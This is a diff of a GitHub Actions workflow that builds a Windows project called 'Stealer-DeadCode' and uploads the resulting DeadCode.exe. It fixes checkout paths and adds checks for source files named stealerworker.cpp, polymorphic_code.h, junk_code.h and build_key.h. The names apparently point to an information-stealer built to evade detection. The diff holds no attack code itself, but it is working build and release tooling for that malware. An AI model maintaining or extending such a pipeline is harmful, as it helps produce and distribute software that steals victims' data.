@@ -18,6 +18,7 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v4
       with:
+        path: Stealer-DeadCode
         fetch-depth: 0
 
     - name: Setup Python
@@ -339,15 +340,16 @@ jobs:
     - name: Debug project structure
       run: |
         Write-Host "Listing contents of project root:"
-        dir D:\a\Stealer-DeadCode
+        dir D:\a\Stealer-DeadCode\Stealer-DeadCode
         Write-Host "Listing contents of ui directory (if exists):"
-        dir D:\a\Stealer-DeadCode\ui -ErrorAction SilentlyContinue
+        dir D:\a\Stealer-DeadCode\Stealer-DeadCode\ui -ErrorAction SilentlyContinue
         Write-Host "Listing contents of src directory (if exists):"
-        dir D:\a\Stealer-DeadCode\src -ErrorAction SilentlyContinue
+        dir D:\a\Stealer-DeadCode\Stealer-DeadCode\src -ErrorAction SilentlyContinue
       shell: powershell
 
     - name: Verify project structure
       run: |
+        cd Stealer-DeadCode
         Write-Host "Current directory: $(Get-Location)"
         Write-Host "Listing contents of project root:"
         dir .
@@ -374,6 +376,31 @@ jobs:
         if (-not (Test-Path ui/mainwindow.h)) {
           Write-Host "Error: mainwindow.h not found in ui/"
           dir ui -ErrorAction SilentlyContinue
+          exit 1
+        }
+        if (-not (Test-Path src/stealerworker.cpp)) {
+          Write-Host "Error: stealerworker.cpp not found in src/"
+          dir src -ErrorAction SilentlyContinue
+          exit 1
+        }
+        if (-not (Test-Path src/build_key.h)) {
+          Write-Host "Error: build_key.h not found in src/"
+          dir src -ErrorAction SilentlyContinue
+          exit 1
+        }
+        if (-not (Test-Path src/polymorphic_code.h)) {
+          Write-Host "Error: polymorphic_code.h not found in src/"
+          dir src -ErrorAction SilentlyContinue
+          exit 1
+        }
+        if (-not (Test-Path src/junk_code.h)) {
+          Write-Host "Error: junk_code.h not found in src/"
+          dir src -ErrorAction SilentlyContinue
+          exit 1
+        }
+        if (-not (Test-Path src/stealerworker.h)) {
+          Write-Host "Error: stealerworker.h not found in src/"
+          dir src -ErrorAction SilentlyContinue
           exit 1
         }
         Write-Host "Creating build directory if it doesn't exist..."
@@ -405,6 +432,7 @@ jobs:
 
     - name: Verify and generate UI files
       run: |
+        cd Stealer-DeadCode
         Write-Host "Checking mainwindow.ui for validity and generating ui_mainwindow.h..."
         $uicPath = "C:/Qt/Qt/5.15.2/mingw81_64/bin/uic.exe"
         if (-not (Test-Path $uicPath)) {
@@ -450,6 +478,7 @@ jobs:
         $env:Path = "C:/Qt/Qt/5.15.2/mingw81_64/bin;C:/vcpkg;" + $env:Path
         Write-Host "Updated PATH: $env:Path"
 
+        cd D:\a\Stealer-DeadCode\Stealer-DeadCode
         Write-Host "Current directory: $(Get-Location)"
         Write-Host "Listing contents of current directory:"
         dir .
@@ -484,10 +513,10 @@ jobs:
       with:
         name: build-logs
         path: |
-          qmake_output.log
-          make_output.log
-          uic_output.log
-          vcpkg_install.log
+          Stealer-DeadCode/qmake_output.log
+          Stealer-DeadCode/make_output.log
+          Stealer-DeadCode/uic_output.log
+          Stealer-DeadCode/vcpkg_install.log
         if-no-files-found: warn
 
     - name: Upload artifact
@@ -495,12 +524,12 @@ jobs:
       with:
         name: DeadCode-Build
         path: |
-          build/DeadCode.exe
+          Stealer-DeadCode/build/DeadCode.exe
         if-no-files-found: error
 
     - name: Cleanup
       if: always()
       run: |
-        Remove-Item -Path "build" -Recurse -Force -ErrorAction SilentlyContinue
-        Remove-Item -Path "release" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "Stealer-DeadCode/build" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "Stealer-DeadCode/release" -Recurse -Force -ErrorAction SilentlyContinue
       shell: powershell
